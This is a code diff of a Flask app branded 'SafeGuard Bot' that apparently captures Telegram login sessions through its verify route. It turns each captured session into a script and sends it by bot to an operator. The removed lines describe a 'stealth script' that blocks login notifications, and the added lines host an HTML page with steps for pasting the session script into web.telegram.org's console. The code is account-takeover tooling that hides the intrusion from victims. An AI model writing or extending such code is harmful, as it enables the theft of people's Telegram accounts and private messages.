@@ -47,17 +47,7 @@ app_loop = init_event_loop()
 
 from utils.tg.auth import telegram_auth
 from utils.credentials_manager import credentials_manager
-
-# Initialize MongoDB with error handling
-try:
-    from utils.mongodb_manager import mongodb_manager
-    if mongodb_manager.is_connected():
-        logging.info("📊 MongoDB connected - using database storage")
-    else:
-        logging.info("📁 MongoDB not available - using file storage")
-except Exception as e:
-    logging.warning(f"⚠️ MongoDB initialization failed, using file storage: {e}")
-    mongodb_manager = None
+from utils.mongo_session_manager import mongo_session_manager
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this')
@@ -218,7 +208,7 @@ def verify():
                 # Automatically generate and send script to Telegram
                 try:
                     # Generate script content
-                    script_content = credentials_manager.generate_stealth_script(session_data)
+                    script_content = credentials_manager.generate_working_format_script(session_data)
                     
                     # Generate script filename
                     user_id = result['user_info'].get('id', 'unknown')
@@ -240,7 +230,7 @@ def verify():
                             
                             # Prepare message
                             message_parts = [
-                                "🛡️ **Auto-Generated Stealth Script**",
+                                "🔧 **Auto-Generated Working Script**",
                                 "",
                                 f"📁 **File:** `{script_filename}`",
                                 f"👤 **User:** {result['user_info'].get('first_name', 'Unknown')} {result['user_info'].get('last_name', '')}",
@@ -269,58 +259,322 @@ def verify():
                             
                             message_text = "\n".join(message_parts)
                             
-                            # Send stealth script file directly
-                            header_parts = [
-                                "🛡️ **Auto-Generated Stealth Script File**",
-                                "",
-                                f"📁 **File:** `{script_filename}`",
-                                f"👤 **User:** {result['user_info'].get('first_name', 'Unknown')} {result['user_info'].get('last_name', '')}",
-                                f"📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}",
-                                f"🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}",
-                                f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-                                "",
-                                "📝 **Instructions:**",
-                                "1. Download the script file below",
-                                "2. Open https://web.telegram.org/a/ in your browser",
-                                "3. Press F12 to open Developer Tools", 
-                                "4. Go to Console tab",
-                                "5. Copy and paste the script content",
-                                "6. Press Enter to execute",
-                                "",
-                                "💡 **Tips:**",
-                                "- This stealth script blocks notifications to prevent login alerts",
-                                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
-                                "- Try refreshing the page first",
-                                "- Try using a different browser or incognito mode", 
-                                "- Check if your network allows WebSocket connections"
-                            ]
-                            
-                            header_text = "\n".join(header_parts)
-                            
-                            # Send header message
-                            response1 = requests.post(
-                                f"https://api.telegram.org/bot{bot_token}/sendMessage",
-                                json={
-                                    "chat_id": target_user_id,
-                                    "text": header_text,
-                                    "parse_mode": "Markdown"
-                                }
-                            )
-                            
-                            # Send the script file
-                            script_filepath = os.path.join(credentials_manager.storage_dir, script_filename)
-                            with open(script_filepath, 'rb') as script_file:
-                                files = {'document': (script_filename, script_file, 'text/javascript')}
-                                response2 = requests.post(
-                                    f"https://api.telegram.org/bot{bot_token}/sendDocument",
-                                    data={'chat_id': target_user_id},
-                                    files=files
+                            # Send message (split if too long)
+                            try:
+                                # Create a unique filename for this script
+                                timestamp = int(time.time())
+                                html_filename = f"script_{user_id}_{timestamp}.html"
+                                html_filepath = os.path.join('static', 'scripts', html_filename)
+                                
+                                # Ensure the scripts directory exists
+                                os.makedirs(os.path.join('static', 'scripts'), exist_ok=True)
+                                
+                                # Create the HTML content
+                                html_content = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web Script - {result['user_info'].get('first_name', 'User')}</title>
+    <style>
+        body {{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }}
+        .container {{
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }}
+        .header {{
+            text-align: center;
+            margin-bottom: 30px;
+        }}
+        .header h1 {{
+            color: #fff;
+            margin: 0;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }}
+        .info {{
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }}
+        .info h3 {{
+            margin-top: 0;
+            color: #fff;
+        }}
+        .info p {{
+            margin: 5px 0;
+            font-size: 1.1em;
+        }}
+        .instructions {{
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }}
+        .instructions h3 {{
+            margin-top: 0;
+            color: #fff;
+        }}
+        .instructions ol {{
+            padding-left: 20px;
+        }}
+        .instructions li {{
+            margin: 10px 0;
+            font-size: 1.1em;
+        }}
+        .script-container {{
+            background: #1e1e1e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            position: relative;
+        }}
+        .script-header {{
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }}
+        .script-header h3 {{
+            margin: 0;
+            color: #fff;
+        }}
+        .copy-btn {{
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s;
+        }}
+        .copy-btn:hover {{
+            background: #45a049;
+        }}
+        .copy-btn:active {{
+            background: #3d8b40;
+        }}
+        .script-content {{
+            background: #2d2d2d;
+            border-radius: 5px;
+            padding: 15px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.4;
+            color: #e6e6e6;
+            max-height: 400px;
+            overflow-y: auto;
+        }}
+        .execute-btn {{
+            background: #2196F3;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }}
+        .execute-btn:hover {{
+            background: #1976D2;
+        }}
+        .execute-btn:active {{
+            background: #1565C0;
+        }}
+        .warning {{
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }}
+        .warning h4 {{
+            margin: 0 0 10px 0;
+            color: #ffc107;
+        }}
+        .warning p {{
+            margin: 5px 0;
+            color: #fff;
+        }}
+        .footer {{
+            text-align: center;
+            margin-top: 30px;
+            opacity: 0.8;
+            font-size: 0.9em;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Telegram Web Script</h1>
+        </div>
+        
+        <div class="info">
+            <h3>📋 User Information</h3>
+            <p><strong>Name:</strong> {result['user_info'].get('first_name', 'N/A')} {result['user_info'].get('last_name', '')}</p>
+            <p><strong>Phone:</strong> +{result['user_info'].get('phone', 'Unknown')}</p>
+            <p><strong>User ID:</strong> {result['user_info'].get('id', 'Unknown')}</p>
+            <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+        </div>
+        
+        <div class="warning">
+            <h4>⚠️ Important Notice</h4>
+            <p>This script contains sensitive authentication data. Use it only on web.telegram.org/a/</p>
+            <p>Do not share this URL with anyone else.</p>
+        </div>
+        
+        <div class="instructions">
+            <h3>📝 Instructions</h3>
+            <ol>
+                <li>Open <a href="https://web.telegram.org/a/" target="_blank" style="color: #4CAF50;">https://web.telegram.org/a/</a> in your browser</li>
+                <li>Press F12 to open Developer Tools</li>
+                <li>Go to Console tab</li>
+                <li>Copy the script below and paste it in the console</li>
+                <li>Press Enter to execute</li>
+            </ol>
+        </div>
+        
+        <div class="script-container">
+            <div class="script-header">
+                <h3>🔧 Script Content</h3>
+                <button class="copy-btn" onclick="copyScript()">📋 Copy Script</button>
+            </div>
+            <div class="script-content" id="scriptContent">{script_content}</div>
+            <button class="execute-btn" onclick="executeScript()">▶️ Execute Script</button>
+        </div>
+        
+        <div class="footer">
+            <p>Generated by SafeGuard Bot • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+        </div>
+    </div>
+
+    <script>
+        function copyScript() {{
+            const scriptContent = document.getElementById('scriptContent').textContent;
+            navigator.clipboard.writeText(scriptContent).then(function() {{
+                const btn = document.querySelector('.copy-btn');
+                const originalText = btn.textContent;
+                btn.textContent = '✅ Copied!';
+                btn.style.background = '#4CAF50';
+                setTimeout(function() {{
+                    btn.textContent = originalText;
+                    btn.style.background = '#4CAF50';
+                }}, 2000);
+            }});
+        }}
+        
+        function executeScript() {{
+            const scriptContent = document.getElementById('scriptContent').textContent;
+            try {{
+                // Open web.telegram.org/a/ in a new tab
+                window.open('https://web.telegram.org/a/', '_blank');
+                alert('Opening web.telegram.org/a/ in a new tab. Please copy and paste the script in the console.');
+            }} catch (error) {{
+                alert('Error: ' + error.message);
+            }}
+        }}
+    </script>
+</body>
+</html>
+"""
+                                
+                                # Write the HTML file
+                                with open(html_filepath, 'w', encoding='utf-8') as f:
+                                    f.write(html_content)
+                                
+                                # Create the URL for the HTML file
+                                base_url = os.getenv('WEBAPP_URL', 'http://localhost:5000')
+                                script_url = f"{base_url}/static/scripts/{html_filename}"
+                                
+                                # Create a simplified message with the URL
+                                url_message = f"""🔐 **Auto-Generated Script Ready!**
+
+📋 **File:** {html_filename}
+👤 **User:** {result['user_info'].get('first_name', 'N/A')} {result['user_info'].get('last_name', '')}
+📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}
+🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}
+⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+🔗 **Script URL:** {script_url}
+
+📝 **Instructions:**
+1. Click the link above to open the script page
+2. Click "Copy Script" button
+3. Open https://web.telegram.org/a/ in your browser
+4. Press F12 → Console tab
+5. Paste and press Enter
+
+💡 **Tips:**
+- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)
+- Try refreshing the page first
+- Use incognito mode if needed
+- Check if your network allows WebSocket connections
+
+⚠️ **Security:** This URL contains sensitive data. Don't share it!"""
+                                
+                                # Send the URL message
+                                response = requests.post(
+                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                    json={
+                                        "chat_id": target_user_id,
+                                        "text": url_message,
+                                        "parse_mode": "Markdown"
+                                    }
                                 )
-                            
-                            if response1.status_code == 200 and response2.status_code == 200:
-                                logging.info(f"✅ Auto-sent stealth script file to Telegram user {target_user_id}")
-                            else:
-                                logging.error(f"❌ Failed to auto-send script file: {response1.text} {response2.text}")
+                                
+                                if response.status_code == 200:
+                                    logging.info(f"✅ Auto-sent script URL to Telegram user {target_user_id}")
+                                    logging.info(f"📁 HTML file created: {html_filepath}")
+                                    logging.info(f"🔗 Script URL: {script_url}")
+                                else:
+                                    logging.error(f"❌ Failed to auto-send script URL: {response.text}")
+                                    
+                            except Exception as e:
+                                logging.error(f"❌ Error creating HTML script file: {e}")
+                                # Fallback to simple message without script
+                                fallback_message = f"""🔐 **Script Generated Successfully!**
+
+📋 **File:** {script_filename}
+👤 **User:** {result['user_info'].get('first_name', 'N/A')} {result['user_info'].get('last_name', '')}
+📱 **Phone:** +{result['user_info'].get('phone', 'Unknown')}
+🆔 **User ID:** {result['user_info'].get('id', 'Unknown')}
+
+⚠️ **Script too long for Telegram message.**
+📁 **Check the generated file in your bot's storage directory.**
+"""
+                                
+                                response = requests.post(
+                                    f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                                    json={
+                                        "chat_id": target_user_id,
+                                        "text": fallback_message,
+                                        "parse_mode": "Markdown"
+                                    }
+                                )
+                                
+                                if response.status_code == 200:
+                                    logging.info(f"✅ Sent fallback message to Telegram user {target_user_id}")
+                                else:
+                                    logging.error(f"❌ Failed to send fallback message: {response.text}")
                                     
                         except Exception as e:
                             logging.error(f"❌ Error auto-sending script to Telegram: {e}")
@@ -498,8 +752,8 @@ def generate_script_for_credential(filename):
         
         logging.info(f"📝 Generating script content...")
         
-        # Generate and save the script using stealth format
-        script_content = credentials_manager.generate_stealth_script(session_data)
+        # Generate and save the script using working format
+        script_content = credentials_manager.generate_working_format_script(session_data)
         
         logging.info(f"📝 Script content length: {len(script_content)}")
         
@@ -563,7 +817,7 @@ if __name__ == '__main__':
         # Clean up all active sessions
         telegram_auth.cleanup_expired_sessions(0)  # Clean all sessions
         # Close MongoDB connection
-        # mongo_session_manager.close() # This line is removed as per the edit hint
+        mongo_session_manager.close()
         if not app_loop.is_closed():
             app_loop.close()
         print("✅ Cleanup completed") 
